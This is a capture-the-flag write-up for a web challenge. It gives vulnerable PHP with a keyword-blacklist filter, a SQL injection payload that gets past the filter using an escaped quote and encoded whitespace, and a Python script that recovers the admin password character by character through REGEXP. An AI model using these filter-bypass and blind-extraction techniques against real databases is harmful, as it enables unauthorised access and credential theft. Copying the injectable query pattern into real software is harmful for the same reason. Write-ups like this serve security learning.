# OLD SCHOOL SQL (web 150)

Source code : 

```PHP
<?php 
include "./config.php";
include "./flag.php";
error_reporting(0);

$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
if(preg_match($black_list, $_GET['user'])) exit(":P"); 
if(preg_match($black_list, $_GET['pw'])) exit(":P"); 


$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 

$result = mysql_query($query);
$result = mysql_fetch_array($result);
$admin_pass = mysql_fetch_array(mysql_query("select pw from chal where user='admin'"));
echo "<h1>query : <strong><b>{$query}</b></strong><br></h1>";
if($result['user']) echo "<h2>Welcome {$result['user']}</h2>"; 
if(($admin_pass['pw'])&&($admin_pass['pw'] === $_GET['pw'])){
    echo $flag;
}

highlight_file(__FILE__); 

?>
```

On seeing the source code we can get to know that the ```'``` is blocked but we can bypass the query as follows 

```PHP
select user from chal where user='\' and pw='%a0||%a01;%00'
```
Now to get the flag we need to dump the admin password for that we are going to use regex. Here is a python script for that.

```python
import requests
url="http://35.200.215.237?user=\&pw=%0a||%0a(user%0aregexp%0a0x61646d696e%0a%26%26%0a(pw)%0aregexp%0a\"^"
pay="1234567890"
passwd=""
for i in range(1,10):
    corr=0
    for j in pay:
        query=url+passwd+j+"\");%00"
        print(query)
        http=requests.get(query)
        if "Welcome admin" in http.text:
            passwd=passwd+j
            print(passwd)
            corr+=1
    if corr==0:
        break
print("Final pw : "+passwd)
```

On dumpling the admins password and submitting the pw=17292115 we get the flag : 
```flag{sQ1_inj3c7i0n_i5_v3ry_3asy}```

***Interesting*** ***fact*** : the 1729 from admins password represents the Ramanujan number about which you can learn [here](https://en.wikipedia.org/wiki/1729_(number). 